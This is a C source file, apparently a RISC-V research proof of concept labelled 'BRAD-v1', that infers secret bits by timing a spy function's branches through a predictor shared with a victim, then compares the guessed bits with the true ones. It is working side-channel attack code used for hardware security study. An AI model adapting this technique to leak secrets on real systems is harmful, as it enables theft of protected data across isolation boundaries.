#include <stdio.h>
#include <stdint.h>
#include "rlibsc.h"

#define SECRET_DATA_LEN   8     
#define ATTACK_ROUNDS     500

static volatile uint8_t sec_data[SECRET_DATA_LEN] = {
    1,0,0,1,
    0,1,1,0,
};

static volatile uint8_t array1[2] = { 0, 1 };

__attribute__((noinline))
static void condBranch(volatile uint8_t *addr)
{
    if (*addr) {
        asm volatile("nop");
        asm volatile("nop");
    } else {
        asm volatile("addi t1, x0, 2");
    }
}

__attribute__((noinline))
static void victim_f(uint8_t idx)
{
    condBranch(&sec_data[idx]);
}

__attribute__((noinline))
static void spy_f(uint8_t idx)
{
    condBranch(&array1[idx]);
}

int main(void)
{
    printf("BRAD-v1 timing test starting…\n");
    printf("SECRET_DATA_LEN=%d, ATTACK_ROUNDS=%d\n\n",
           SECRET_DATA_LEN, ATTACK_ROUNDS);

    uint8_t guessed_secret[SECRET_DATA_LEN];

    for (int i = 0; i < SECRET_DATA_LEN; i++) {

        uint64_t sum0 = 0;   
        uint64_t sum1 = 0;   

        for (int k = 0; k < ATTACK_ROUNDS; k++) {
            victim_f(i);
            victim_f(i);
            fence();

            uint64_t start0 = rdcycle();
            spy_f(0);
            uint64_t end0 = rdcycle();
            sum0 += (end0 - start0);

            uint64_t start1 = rdcycle();
            spy_f(1);
            uint64_t end1 = rdcycle();
            sum1 += (end1 - start1);
        }

        double avg0 = (double)sum0 / (double)ATTACK_ROUNDS;
        double avg1 = (double)sum1 / (double)ATTACK_ROUNDS;

        uint8_t guess_bit = (avg0 < avg1) ? 0 : 1;
        guessed_secret[i] = guess_bit;

        printf("Index %2d | true=%u | avg(spy0)=%d cycles | avg(spy1)=%d cycles | ",
               i, (unsigned)sec_data[i], (int)avg0, (int)avg1);

        if (avg0 < avg1) {
            printf("faster=spy(0) → guess=0\n");
        } else {
            printf("faster=spy(1) → guess=1\n");
        }
    }

    printf("\nGuessed secret bits: ");
    for (int i = 0; i < SECRET_DATA_LEN; i++) {
        printf("%u", (unsigned)guessed_secret[i]);
    }
    printf("\nTrue    secret bits: ");
    for (int i = 0; i < SECRET_DATA_LEN; i++) {
        printf("%u", (unsigned)sec_data[i]);
    }
    printf("\n");

    return 0;
}